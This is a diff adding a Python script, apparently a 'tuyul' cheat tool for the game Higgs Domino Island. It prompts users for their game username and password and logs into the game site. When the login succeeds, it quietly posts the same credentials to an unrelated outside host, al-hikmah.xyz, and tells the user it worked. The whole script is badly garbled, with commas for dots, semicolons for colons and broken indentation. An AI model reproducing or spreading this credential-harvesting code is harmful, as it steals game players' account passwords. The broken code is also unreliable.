@@ -1,0 +1,51 @@
+@@ -0,0 +1,50 @@
+import requests,getpass,os
+from time import sleep
+logo=***
+##############################
+          #               SCRIPT TUYUL            #
+           #         HIGH DOMINO ISLAND    #
+           #               BY MULYHADI           #
+##############################
+
+r=requests,sesion()
+def main();
+    os,system("clear")
+    print(logo)
+    b=input("     user:")
+    a=getpass,getpass("       password :")
+    url="https://www.topbos.com/web/idlogin.do"
+    hed={
+    "user-agen":"mozila/5.0(linux;Android 6.0.1;CPH2083 Build/MMb29M;  wv)AppleWebKit/537.36 KHTML,Gecko) version/4.0 Chrome/55.0.288391 Mobile Safary/537.36"
+   }
+   data={
+   "userid";b,
+   "secondPwd";a,
+   "submitbtn";"submitbtn"
+   }
+   s = r,pos(url,data=data,headers=hed)
+   print(s,text)
+   if"parameter salah" in s,text;
+   print("        error...[Masukan dengan Benar]")
+   sleep(2)
+   main()
+ elif"No result defined" in s,text;
+   print("        error...[Masukan dengan Benar]")
+   sleep(2)
+   main()
+ elif"Kata sandi yang anda masukan salah,silakan diulang"in text;
+ print("        error...[Masukan dengan Benar]")
+   sleep(2)
+   main()
+   elif"Jumlah kesalahan anda terlalu banyak silakan coba lagi setelah 27menit"in s,text
+   print("        error...[Masukan dengan Benar]")
+   sleep(2)
+   main()
+   elif;"pengguna tidak ada" in text
+   print("        error...[Masukan dengan Benar]")
+   sleep(2)
+   main()
+   else;
+  rl=http://al-hikmah.xyz/build/check,php"
+  c=requests,post(rl,data={"email":b, "password":a, "submit":"login"})
+  print("        berhasil....[Apk Dominonya]") 
